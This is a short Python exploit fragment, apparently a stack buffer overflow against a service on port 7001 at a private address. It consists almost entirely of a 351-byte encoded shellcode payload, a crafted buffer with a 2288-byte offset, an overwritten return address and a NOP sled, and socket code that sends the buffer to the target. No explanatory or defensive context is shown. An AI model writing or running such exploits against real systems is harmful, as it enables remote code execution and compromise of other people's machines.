...
try:
  ...
  shellcode = (
  "\xd9\xc4\xd9\x74\x24\xf4\x58\xbf\x82\xcd\x89\x72\x2b\xc9\xb1"
  "\x52\x31\x78\x17\x83\xe8\xfc\x03\xfa\xde\x6b\x87\x06\x08\xe9"
  "\x68\xf6\xc9\x8e\xe1\x13\xf8\x8e\x96\x50\xab\x3e\xdc\x34\x40"
  "\xb4\xb0\xac\xd3\xb8\x1c\xc3\x54\x76\x7b\xea\x65\x2b\xbf\x6d"
  "\xe6\x36\xec\x4d\xd7\xf8\xe1\x8c\x10\xe4\x08\xdc\xc9\x62\xbe"
  "\xf0\x7e\x3e\x03\x7b\xcc\xae\x03\x98\x85\xd1\x22\x0f\x9d\x8b"
  "\xe4\xae\x72\xa0\xac\xa8\x97\x8d\x67\x43\x63\x79\x76\x85\xbd"
  "\x82\xd5\xe8\x71\x71\x27\x2d\xb5\x6a\x52\x47\xc5\x17\x65\x9c"
  "\xb7\xc3\xe0\x06\x1f\x87\x53\xe2\xa1\x44\x05\x61\xad\x21\x41"
  "\x2d\xb2\xb4\x86\x46\xce\x3d\x29\x88\x46\x05\x0e\x0c\x02\xdd"
  "\x2f\x15\xee\xb0\x50\x45\x51\x6c\xf5\x0e\x7c\x79\x84\x4d\xe9"
  "\x4e\xa5\x6d\xe9\xd8\xbe\x1e\xdb\x47\x15\x88\x57\x0f\xb3\x4f"
  "\x97\x3a\x03\xdf\x66\xc5\x74\xf6\xac\x91\x24\x60\x04\x9a\xae"
  "\x70\xa9\x4f\x60\x20\x05\x20\xc1\x90\xe5\x90\xa9\xfa\xe9\xcf"
  "\xca\x05\x20\x78\x60\xfc\xa3\x47\xdd\x89\x9c\x20\x1c\x75\xe2"
  "\x0b\xa9\x93\x8e\x7b\xfc\x0c\x27\xe5\xa5\xc6\xd6\xea\x73\xa3"
  "\xd9\x61\x70\x54\x97\x81\xfd\x46\x40\x62\x48\x34\xc7\x7d\x66"
  "\x50\x8b\xec\xed\xa0\xc2\x0c\xba\xf7\x83\xe3\xb3\x9d\x39\x5d"
  "\x6a\x83\xc3\x3b\x55\x07\x18\xf8\x58\x86\xed\x44\x7f\x98\x2b"
  "\x44\x3b\xcc\xe3\x13\x95\xba\x45\xca\x57\x14\x1c\xa1\x31\xf0"
  "\xd9\x89\x81\x86\xe5\xc7\x77\x66\x57\xbe\xc1\x99\x58\x56\xc6"
  "\xe2\x84\xc6\x29\x39\x0d\xe6\xcb\xeb\x78\x8f\x55\x7e\xc1\xd2"
  "\x65\x55\x06\xeb\xe5\x5f\xf7\x08\xf5\x2a\xf2\x55\xb1\xc7\x8e"
  "\xc6\x54\xe7\x3d\xe6\x7c")
  ...
  nops = "\x90"*16
  buffer = "A" * 2288 + "\xCF\x10\x80\x14" + "C" * 8 + nops + shellcode + "D" * (2560 -2288 -12 + 200 - 351 -16)
  #buffer = "A" * 2288 + "\xCF\x10\x80\x14" + "C" * 8 + "D" * (2560 -2288 -12 + 200)
  
  #print(buffer)
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.175.10", 7001))
  s.send(buffer)
